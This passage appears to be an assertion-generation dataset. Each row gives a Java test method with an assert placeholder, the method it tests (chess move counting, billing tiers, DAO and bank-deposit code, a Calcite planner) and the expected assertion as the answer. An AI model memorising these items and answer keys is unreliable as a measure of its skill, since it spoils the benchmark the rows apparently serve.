getLegalMoves() { final Piece king = getKing(playerToMove); //better to check for pin from king than discoveries if (inCheck) { final Set<Piece> attackers = attackingKing(king); final List<Move> legalMoves = new ArrayList<>(getMoveList(king)); if (attackers.size() < 2) { final Set<Piece> pinnedToKing = pinnedToKing(king).keySet(); final List<Piece> movableExceptKing = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.contains(piece)) .filter(piece -> !(piece.sameType(PieceType.KING))) .collect(Collectors.toList()); final Piece attacker = new ArrayList<>(attackers).get(0); final Set<Cell> cellsWithCheck = rayOfCheck(king, attacker); if (attacker.sameType(PieceType.PAWN)) { //enPassant can capture a checking pawn movableExceptKing.stream() .filter(piece -> piece.sameType(PieceType.PAWN)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> move.captureMove) .filter(move -> move.captureCell.equals(attacker.position)) .filter(move -> !move.captureCell.equals(move.target)) .forEach(legalMoves::add); } legalMoves.addAll(movableExceptKing.stream() .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> cellsWithCheck.contains(move.target)) .collect(Collectors.toList())); } return legalMoves; } else { final Map<Piece, Piece> pinnedToKing = pinnedToKing(king); final List<Move> normalMoves = playerPieces.get(playerToMove).stream() .filter(piece -> !pinnedToKing.containsKey(piece)) .map(this::getMoveList) .flatMap(Collection::stream) .filter(move -> !illegalEnPassant(move, king)) .collect(Collectors.toList()); final List<Move> pinnedPieceMoves = pinnedToKing.entrySet() .stream() .filter(entry -> !entry.getKey().sameType(PieceType.KNIGHT)) .map(this::getMovesWithinPin) .flatMap(Collection::stream) .collect(Collectors.toList()); normalMoves.addAll(pinnedPieceMoves); return normalMoves; } }"	assertEquals(22, board.getLegalMoves().size())
"otherBoard() { Board board = Board.getStartBoard(); board.makeMove(Move.get(board.getPiece(1, 4), Cell.get(3, 4), false)); Engine engine = new Engine(); board = board.copy(); board.makeMove(Move.get(board.getPiece(6, 3), Cell.get(5, 3), false)); board = board.copy(); board.makeMove(Move.get(board.getPiece(3, 4), Cell.get(4, 4), false)); board = board.copy(); board.makeMove(Move.get(board.getPiece(6, 5), Cell.get(4, 5), false)); //        board = board.copy(); //        board.makeMove(board.getPiece(4, 4).getMoveList(board).stream().filter(c -> c.captureMove).filter(c -> c.captureCell.equals(Cell.get(4, 5))).findAny().get()); final int positions = engine.countAllMoves(board, 2); System.out.println(board); System.out.println(""NUMBER OF POSITIONS: "" + positions); System.out.println(board.fenRepresentation()); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(729, positions)
"countMovesAtPositionRandom() { Board board = Board.getBoard(""r3k2r/p1ppqpb1/bn2pnp1/3PN3/1p2P3/2N2Q1p/PPPBBPPP/R4K1R b kq -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 3); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(77887, positions)
"countMovesAtPositionInCheck() { Board board = Board.getBoard(""r3k2r/p1ppqpb1/bn2pnp1/3PN3/1p2P3/2N2Q2/PPPBBPpP/R4K1R w kq -""); board.inCheck = true; System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 2); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(188, positions)
"countMovesAtPositionMovesAfterCheck() { Board board = Board.getBoard(""r3k2r/p1ppqpb1/bn2pnp1/3PN3/1p2P3/2N2Q2/PPPBBPpP/R3K2R b kq -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 1); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(52, positions)
"countMovesAtPositionMovesAfterCheck2() { Board board = Board.getBoard(""r3k2r/p1ppqpb1/bn2pnp1/3PN3/1p2P3/2N2Q2/PPPBBPpP/R5KR b kq -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 1); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(48, positions)
"queenToEdge() { Board board = Board.getBoard(""r3k2r/p1ppqpb1/bn2pnp1/3PN2Q/1p2P3/2N4p/PPPBBPPP/R3K2R b KQkq -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 3); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(95034, positions)
"queenToDeath() { Board board = Board.getBoard(""r3k1r1/p1ppqpb1/bn2pnp1/3PN2Q/1p2P3/2N4p/PPPBBPPP/R3K2R w KQq -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 2); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(2079, positions)
"queenToDeathBlockCastle() { Board board = Board.getBoard(""r3k1r1/p1ppqpb1/Bn2pnp1/3PN2Q/1p2P3/2N4p/PPPB1PPP/R3K2R b KQq -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 1); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(32, positions)
"queenDeterminedToCommitSuicide() { Board board = Board.getBoard(""r3k1rQ/p1ppqpb1/bn2pnp1/3PN3/1p2P3/2N4p/PPPBBPPP/R3K2R b KQq -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 1); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(38, positions)
"rookEndgameWithKing() { Board board = Board.getBoard(""8/2p5/3p4/KP4kr/5p2/8/4P1P1/1R6 w - -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 4, 4); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth, final int printAt) { final List<Move> legalMoves = board.getLegalMoves(); if (legalMoves.isEmpty()) { return 0; } if (depth == 1) { return legalMoves.size(); } return legalMoves.stream().mapToInt(move -> { final Board copy = board.copy(); copy.makeMove(move); final int countAllMoves = countAllMoves(copy, depth - 1, printAt); if (depth == printAt) { System.out.println(getString(move) + "": "" + countAllMoves + "" "" + move + "" "" + copy.fenRepresentation()); } return countAllMoves; }).sum(); }"	assertEquals(104371, positions)
"rookEndgameWithKing8() { Board board = Board.getBoard(""8/2p5/3p4/KP4kr/5pP1/8/4P3/1R6 b - g3""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 3, 1); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth, final int printAt) { final List<Move> legalMoves = board.getLegalMoves(); if (legalMoves.isEmpty()) { return 0; } if (depth == 1) { return legalMoves.size(); } return legalMoves.stream().mapToInt(move -> { final Board copy = board.copy(); copy.makeMove(move); final int countAllMoves = countAllMoves(copy, depth - 1, printAt); if (depth == printAt) { System.out.println(getString(move) + "": "" + countAllMoves + "" "" + move + "" "" + copy.fenRepresentation()); } return countAllMoves; }).sum(); }"	assertEquals(5260, positions)
"rookEndgameWithKing8_1() { Board board = Board.getBoard(""8/8/2pp4/KP4kr/5pP1/8/4P3/1R6 w - -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 2, 2); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth, final int printAt) { final List<Move> legalMoves = board.getLegalMoves(); if (legalMoves.isEmpty()) { return 0; } if (depth == 1) { return legalMoves.size(); } return legalMoves.stream().mapToInt(move -> { final Board copy = board.copy(); copy.makeMove(move); final int countAllMoves = countAllMoves(copy, depth - 1, printAt); if (depth == printAt) { System.out.println(getString(move) + "": "" + countAllMoves + "" "" + move + "" "" + copy.fenRepresentation()); } return countAllMoves; }).sum(); }"	assertEquals(295, positions)
"rookEndgameWithKing9() { Board board = Board.getBoard(""8/2p5/3p4/KP4k1/5pP1/8/4P3/1R5r w - -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 2, 1); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth, final int printAt) { final List<Move> legalMoves = board.getLegalMoves(); if (legalMoves.isEmpty()) { return 0; } if (depth == 1) { return legalMoves.size(); } return legalMoves.stream().mapToInt(move -> { final Board copy = board.copy(); copy.makeMove(move); final int countAllMoves = countAllMoves(copy, depth - 1, printAt); if (depth == printAt) { System.out.println(getString(move) + "": "" + countAllMoves + "" "" + move + "" "" + copy.fenRepresentation()); } return countAllMoves; }).sum(); }"	assertEquals(328, positions)
"rookEndgameWithKing10() { Board board = Board.getBoard(""8/2p5/3p4/KP4k1/5pP1/8/4P3/6Rr b - -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 1, 1); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth, final int printAt) { final List<Move> legalMoves = board.getLegalMoves(); if (legalMoves.isEmpty()) { return 0; } if (depth == 1) { return legalMoves.size(); } return legalMoves.stream().mapToInt(move -> { final Board copy = board.copy(); copy.makeMove(move); final int countAllMoves = countAllMoves(copy, depth - 1, printAt); if (depth == printAt) { System.out.println(getString(move) + "": "" + countAllMoves + "" "" + move + "" "" + copy.fenRepresentation()); } return countAllMoves; }).sum(); }"	assertEquals(16, positions)
"rookEndgameWithKingPawn() { Board board = Board.getBoard(""8/2p5/3p4/KP4kr/4Pp2/8/6P1/1R6 b - e3""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 3, 3); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth, final int printAt) { final List<Move> legalMoves = board.getLegalMoves(); if (legalMoves.isEmpty()) { return 0; } if (depth == 1) { return legalMoves.size(); } return legalMoves.stream().mapToInt(move -> { final Board copy = board.copy(); copy.makeMove(move); final int countAllMoves = countAllMoves(copy, depth - 1, printAt); if (depth == printAt) { System.out.println(getString(move) + "": "" + countAllMoves + "" "" + move + "" "" + copy.fenRepresentation()); } return countAllMoves; }).sum(); }"	assertEquals(5503, positions)
"rookEndgameWithKingRookMove() { Board board = Board.getBoard(""8/2p5/3p4/KP4k1/4Pp2/7r/6P1/1R6 w - -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 2, 2); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth, final int printAt) { final List<Move> legalMoves = board.getLegalMoves(); if (legalMoves.isEmpty()) { return 0; } if (depth == 1) { return legalMoves.size(); } return legalMoves.stream().mapToInt(move -> { final Board copy = board.copy(); copy.makeMove(move); final int countAllMoves = countAllMoves(copy, depth - 1, printAt); if (depth == printAt) { System.out.println(getString(move) + "": "" + countAllMoves + "" "" + move + "" "" + copy.fenRepresentation()); } return countAllMoves; }).sum(); }"	assertEquals(412, positions)
"rookEndgameWithKingRookMoving() { Board board = Board.getBoard(""7r/2p5/3p4/KP4k1/4Pp2/8/6P1/1R6 w - -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 2, 2); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth, final int printAt) { final List<Move> legalMoves = board.getLegalMoves(); if (legalMoves.isEmpty()) { return 0; } if (depth == 1) { return legalMoves.size(); } return legalMoves.stream().mapToInt(move -> { final Board copy = board.copy(); copy.makeMove(move); final int countAllMoves = countAllMoves(copy, depth - 1, printAt); if (depth == printAt) { System.out.println(getString(move) + "": "" + countAllMoves + "" "" + move + "" "" + copy.fenRepresentation()); } return countAllMoves; }).sum(); }"	assertEquals(407, positions)
"rookEndgameWithKingRookMoveA() { Board board = Board.getBoard(""8/2p5/8/KP1p2kr/4Pp2/8/6P1/1R6 w - -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 2, 2); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth, final int printAt) { final List<Move> legalMoves = board.getLegalMoves(); if (legalMoves.isEmpty()) { return 0; } if (depth == 1) { return legalMoves.size(); } return legalMoves.stream().mapToInt(move -> { final Board copy = board.copy(); copy.makeMove(move); final int countAllMoves = countAllMoves(copy, depth - 1, printAt); if (depth == printAt) { System.out.println(getString(move) + "": "" + countAllMoves + "" "" + move + "" "" + copy.fenRepresentation()); } return countAllMoves; }).sum(); }"	assertEquals(305, positions)
"rookEndgameWithKing2() { Board board = Board.getBoard(""8/2p5/3p4/KP4kr/5p2/8/4P1P1/6R1 b - -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 3); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(5007, positions)
"rookEndgameWithKing3() { Board board = Board.getBoard(""8/2p5/3p4/KP4k1/5p1r/8/4P1P1/6R1 w - -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 2); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(271, positions)
"rookEndgameWithKing4() { Board board = Board.getBoard(""8/2p5/3p4/KP4k1/5pPr/8/4P3/6R1 b - g3""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 1); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(16, positions)
"rookEndgameWithKing5() { Board board = Board.getBoard(""8/2p5/3p4/KP4kr/1R3p2/8/4P1P1/8 b - -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 3); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(5013, positions)
"rookEndgameWithKing6() { Board board = Board.getBoard(""8/2p5/3p4/KP5r/1R3p1k/8/4P1P1/8 w - -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 2); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(191, positions)
"moveKingInChaos() { Board board = Board.getBoard(""r6r/Ppppkppp/1b3nbN/nPP5/BB2P3/q4N2/Pp1P2PP/R2Q1RK1 w - -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 4); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(2539008, positions)
"moveKingInChaos2() { Board board = Board.getBoard(""r6r/Ppppkppp/1P3nbN/nP6/BB2P3/q4N2/Pp1P2PP/R2Q1RK1 b - -""); board.inCheck = true; System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 3); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(9501, positions)
"moveKingInChaos20() { Board board = Board.getBoard(""r2k3r/Pppp1ppp/1P3nbN/nP6/BB2P3/q4N2/Pp1P2PP/R2Q1RK1 w - -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 2); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(1475, positions)
"moveKingInChaos21() { Board board = Board.getBoard(""r2k3r/PpPp1ppp/5nbN/nP6/BB2P3/q4N2/Pp1P2PP/R2Q1RK1 b - -""); board.inCheck = true; System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 1); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(3, positions)
"moveKingInChaos0() { Board board = Board.getBoard(""r6r/Pppp1ppp/1P2knbN/nP6/BB2P3/q4N2/Pp1P2PP/R2Q1RK1 w - -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 2); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(1614, positions)
"moveKingInChaos1() { Board board = Board.getBoard(""r6r/Pppp1ppp/1P2knbN/nP2P3/BB6/q4N2/Pp1P2PP/R2Q1RK1 b - -""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 1); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(51, positions)
"moveKingInChaos3() { Board board = Board.getBoard(""r6r/Pp1pkppp/1P3nbN/nPp5/BB2P3/q4N2/Pp1P2PP/R2Q1RK1 w - c6""); System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 2); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(1550, positions)
"moveKingInChaos4() { Board board = Board.getBoard(""r6r/Pp1pkppp/1PP2nbN/n7/BB2P3/q4N2/Pp1P2PP/R2Q1RK1 b - -""); board.inCheck = true; System.out.println(board); Engine engine = new Engine(); final int positions = engine.countAllMoves(board, 1); System.out.println(""NUMBER OF POSITIONS: "" + positions); Assert.""<AssertPlaceHolder>""; }
countAllMoves(final Board board, final int depth) { return countAllMoves(board, depth, 1000); }"	assertEquals(5, positions)
"Exception { Class<? extends DemoUtil> oldClass = DemoUtil.getInstance().getClass(); log.error(""热更新前的类：{}"" , oldClass);  // 热更新 RegistryManager.getInstance().hotswap(new String[]{DemoUtil.class.getName()});  Class<? extends DemoUtil> newClass = DemoUtil.getInstance().getClass(); log.error(""热更新后的类(已替换为原类的子类)：{}"" , newClass);  // newClass是oldClass的子类 Assert.""<AssertPlaceHolder>""; }
getInstance() { return HOLDER.instance; }"	assertTrue(oldClass.isAssignableFrom(newClass))
"findPackageClass() { Set<Class<?>> packageClass = PackageUtil.findPackageClass(""com.cm4j""); ""<AssertPlaceHolder>""; }
findPackageClass(String packageName) { // 第一个class类的集合 Set<Class<?>> classes = new LinkedHashSet<>(); // 是否循环迭代 boolean recursive = true; // 获取包的名字 并进行替换 String packageDirName = packageName.replace('.', '/'); // 定义一个枚举的集合 并进行循环来处理这个目录下的things Enumeration<URL> dirs; try { dirs = Thread.currentThread().getContextClassLoader().getResources(packageDirName); // 循环迭代下去 while (dirs.hasMoreElements()) { // 获取下一个元素 URL url = dirs.nextElement(); // 得到协议的名称 String protocol = url.getProtocol(); // 如果是以文件的形式保存在服务器上 if (""file"".equals(protocol)) { // 获取包的物理路径 String filePath = URLDecoder.decode(url.getFile(), ""UTF-8""); // 以文件的方式扫描整个包下的文件 并添加到集合中 findAndAddClassesInPackageByFile(packageName, filePath, recursive, classes); } else if (""jar"".equals(protocol)) { // 如果是jar包文件 // 定义一个JarFile JarFile jar; try { // 获取jar jar = ((JarURLConnection) url.openConnection()).getJarFile(); // 从此jar包 得到一个枚举类 Enumeration<JarEntry> entries = jar.entries(); // 同样的进行循环迭代 while (entries.hasMoreElements()) { // 获取jar里的一个实体 可以是目录 和一些jar包里的其他文件 如META-INF等文件 JarEntry entry = entries.nextElement(); String name = entry.getName(); // 如果是以/开头的 if (name.charAt(0) == '/') { // 获取后面的字符串 name = name.substring(1); } // 如果前半部分和定义的包名相同 if (name.startsWith(packageDirName)) { int idx = name.lastIndexOf('/'); // 如果以""/""结尾 是一个包 if (idx != -1) { // 获取包名 把""/""替换成""."" packageName = name.substring(0, idx).replace('/', '.'); } // 如果可以迭代下去 并且是一个包 if ((idx != -1) || recursive) { // 如果是一个.class文件 而且不是目录 if (name.endsWith("".class"") && !entry.isDirectory()) { // 去掉后面的"".class"" 获取真正的类名 String className = name.substring(packageName.length() + 1, name.length() - 6); try { // 添加到classes classes.add(Class.forName(packageName + '.' + className)); } catch (ClassNotFoundException e) { log.error(""添加用户自定义视图类错误 找不到此类的.class文件"", e); } } } } } } catch (IOException e) { log.error(""在扫描用户定义视图时从jar包获取文件出错"", e); } } } } catch (IOException e) { log.error("""", e); }  return classes; }"	assertFalse(packageClass.isEmpty())
"testCalculateBillAmount_Input_0() { bill = new EBBill(0); ""<AssertPlaceHolder>""; }
calculateBillAmount() { double amount=0.0;  if (units > 0) { if (units <= 50) amount = units * 2.60; else if (units <= 100) amount = 130 + ((units - 50) * 3.25); else if (units <= 200) amount = 130 + 162.50 + ((units - 100 ) * 5.26); else if (units <= 1000) amount = 130 + 162.50 + 526 + ((units - 200 ) * 7.75); else if (units <= 5000) amount = 130 + 162.50 + 526 + 6200 + ((units - 1000) * 10); else amount = 0.0; } return amount; }"	assertEquals(0, bill.calculateBillAmount(), 0.001)
"testCalculateBillAmount_Input_50() { bill = new EBBill(50); ""<AssertPlaceHolder>""; }
calculateBillAmount() { double amount=0.0;  if (units > 0) { if (units <= 50) amount = units * 2.60; else if (units <= 100) amount = 130 + ((units - 50) * 3.25); else if (units <= 200) amount = 130 + 162.50 + ((units - 100 ) * 5.26); else if (units <= 1000) amount = 130 + 162.50 + 526 + ((units - 200 ) * 7.75); else if (units <= 5000) amount = 130 + 162.50 + 526 + 6200 + ((units - 1000) * 10); else amount = 0.0; } return amount; }"	assertEquals(130, bill.calculateBillAmount(), 0.001)
"testCalculateBillAmount_Input_100() { bill = new EBBill(100); ""<AssertPlaceHolder>""; }
calculateBillAmount() { double amount=0.0;  if (units > 0) { if (units <= 50) amount = units * 2.60; else if (units <= 100) amount = 130 + ((units - 50) * 3.25); else if (units <= 200) amount = 130 + 162.50 + ((units - 100 ) * 5.26); else if (units <= 1000) amount = 130 + 162.50 + 526 + ((units - 200 ) * 7.75); else if (units <= 5000) amount = 130 + 162.50 + 526 + 6200 + ((units - 1000) * 10); else amount = 0.0; } return amount; }"	assertEquals(292.5, bill.calculateBillAmount(), 0.001)
"testCalculateBillAmount_Input_200() { bill = new EBBill(200); ""<AssertPlaceHolder>""; }
calculateBillAmount() { double amount=0.0;  if (units > 0) { if (units <= 50) amount = units * 2.60; else if (units <= 100) amount = 130 + ((units - 50) * 3.25); else if (units <= 200) amount = 130 + 162.50 + ((units - 100 ) * 5.26); else if (units <= 1000) amount = 130 + 162.50 + 526 + ((units - 200 ) * 7.75); else if (units <= 5000) amount = 130 + 162.50 + 526 + 6200 + ((units - 1000) * 10); else amount = 0.0; } return amount; }"	assertEquals(818.5, bill.calculateBillAmount(), 0.001)
"testCalculateBillAmount_Input_1000() { bill = new EBBill(1000); ""<AssertPlaceHolder>""; }
calculateBillAmount() { double amount=0.0;  if (units > 0) { if (units <= 50) amount = units * 2.60; else if (units <= 100) amount = 130 + ((units - 50) * 3.25); else if (units <= 200) amount = 130 + 162.50 + ((units - 100 ) * 5.26); else if (units <= 1000) amount = 130 + 162.50 + 526 + ((units - 200 ) * 7.75); else if (units <= 5000) amount = 130 + 162.50 + 526 + 6200 + ((units - 1000) * 10); else amount = 0.0; } return amount; }"	assertEquals(7018.5, bill.calculateBillAmount(), 0.001)
"testCalculateBillAmount_Input_5000() { bill = new EBBill(5000); ""<AssertPlaceHolder>""; }
calculateBillAmount() { double amount=0.0;  if (units > 0) { if (units <= 50) amount = units * 2.60; else if (units <= 100) amount = 130 + ((units - 50) * 3.25); else if (units <= 200) amount = 130 + 162.50 + ((units - 100 ) * 5.26); else if (units <= 1000) amount = 130 + 162.50 + 526 + ((units - 200 ) * 7.75); else if (units <= 5000) amount = 130 + 162.50 + 526 + 6200 + ((units - 1000) * 10); else amount = 0.0; } return amount; }"	assertEquals(47018.5, bill.calculateBillAmount(), 0.001)
"test19VewTicketsMovieWise() { // test the viewTicketsMovieWise method Map<String, List<MovieTicket>> map = bookAMovie.viewTicketsMovieWise(); int l = map.size();  ""<AssertPlaceHolder>""; }
viewTicketsMovieWise() { Map<String, List<MovieTicket>> temp = new LinkedHashMap<String, List<MovieTicket>>();  for (MovieTicket ticketObj : movieTicketList) { String movieName = ticketObj.getMovieName();  if (!temp.containsKey(movieName)) { temp.put(movieName, new ArrayList<MovieTicket>()); }  temp.get(movieName).add(ticketObj); }  return temp; }"	assertEquals(4, l)
"test20ViewScreenWiseTotalSeatsBooked() { // test the viewScreenWiseTotalSeatsBooked method Map<Integer, Integer> map = bookAMovie.viewScreenWiseTotalSeatsBooked(LocalDate.parse(""2017-10-25""), LocalDate.now());  ""<AssertPlaceHolder>""; }
viewScreenWiseTotalSeatsBooked(LocalDate fromDate, LocalDate toDate) { Map<Integer, Integer> temp = new LinkedHashMap<Integer, Integer>();  for (MovieTicket ticketObj : movieTicketList) { if (ticketObj.getShowDate().compareTo(fromDate) >= 0 && ticketObj.getShowDate().compareTo(toDate) <= 0) { int screenNumber = ticketObj.getScreenNumber();  if (!temp.containsKey(screenNumber)) { temp.put(screenNumber, 0); }  temp.put(screenNumber, temp.get(screenNumber) + ticketObj.getNumberOfSeats()); }  }  return temp; }"	assertFalse(map.isEmpty())
"testLoginDAO_deleteNonExistingLogin_AlterUsernameAndPassword() { login.setUserName(""""); login.setPassword(""""); ""<AssertPlaceHolder>""; }
setPassword(String password) { this.Password = password; }"	assertFalse(logindao.deleteLogin(login))
"testProductDAO_deleteNonExistingProduct_AlteringProductIdAndName() { product.setProductId(""""); product.setProductName(""""); ""<AssertPlaceHolder>""; }
setProductName(String productName) { this.productName = productName; }"	assertFalse(productdao.deleteProduct(product))
"AccountTransactionException { // fill code  // when boolean isDeposited = dao.deposit(""ISBN0000"", 4000.0); // Method call // then verify(ds, times(1)).getConnection(); verify(con, times(1)).prepareStatement(anyString()); verify(ps, times(1)).executeUpdate(); ""<AssertPlaceHolder>""; }
deposit(String accNo, double amount) throws AccountTransactionException { try { if (accNo == null || accNo.isEmpty()) { throw new AccountTransactionException(""Invalid account number""); }  if (amount <= 0) { throw new AccountTransactionException(""Invalid amount""); }  Connection con = ds.getConnection(); PreparedStatement ps = con.prepareStatement(""UPDATE ACCOUNT SET balance = balance + ? WHERE accNo = ?""); ps.setDouble(1, amount); ps.setString(2, accNo); int result = ps.executeUpdate(); return result > 0; } catch (SQLException ex) { throw new AccountTransactionException(ex.getMessage()); } }"	assertTrue(isDeposited)
"testPrintTvrRule() { VolcanoPlanner planner = new VolcanoPlanner(); planner.addRelTraitDef(ConventionTraitDef.INSTANCE);  RelOptRuleOperand leftOp = operand(NoneLeafRel.class, any()); RelOptRuleOperand rightOp = operand(PhysLeafRel.class, any()); RelOptRuleOperand singleOp = operand(Join.class, leftOp, rightOp);  RelOptRuleOperand childOp = operand(TableScan.class, any()); RelOptRuleOperand parentOp = operand(NoneSingleRel.class, childOp);  RelOptRuleOperand op = operand(Union.class, any());  TvrRelOptRuleOperand tvr1 = new TvrRelOptRuleOperand(); tvr1.addTvrConnection(TvrSemantics.class, TvrSemantics.SET_SNAPSHOT_MAX::equals, null, leftOp, false); tvr1.addTvrConnection(TvrSemantics.class, x -> DELTA.equals(x), null, parentOp, false);  TvrRelOptRuleOperand tvr2 = new TvrRelOptRuleOperand(); tvr2.addTvrConnection(TvrSemantics.class, TvrSemantics.SET_SNAPSHOT_MAX::equals, null, parentOp, false); tvr2.addTvrConnection(TvrSemantics.class, x -> DELTA.equals(x), null, childOp, false); tvr2.addTvrConnection(TvrSemantics.class, x -> SNAPSHOT.equals(x), null, op, false);  tvr1.addTvrPropertyEdge(TvrProperty.class, x -> true, tvr2); tvr2.addTvrPropertyEdge(TvrProperty.class, x -> true, tvr1);  planner.addRule(new PrintTvrMatchRule(op));  planner.addRule(new PhysLeafRule());  RelOptCluster cluster = newCluster(planner); NoneLeafRel leafRel = new NoneLeafRel(cluster, ""a""); RelNode convertedRel = planner .changeTraits(leafRel, cluster.traitSetOf(PHYS_CALLING_CONVENTION)); planner.setRoot(convertedRel); RelNode result = planner.chooseDelegate().findBestExp(); ""<AssertPlaceHolder>""; }
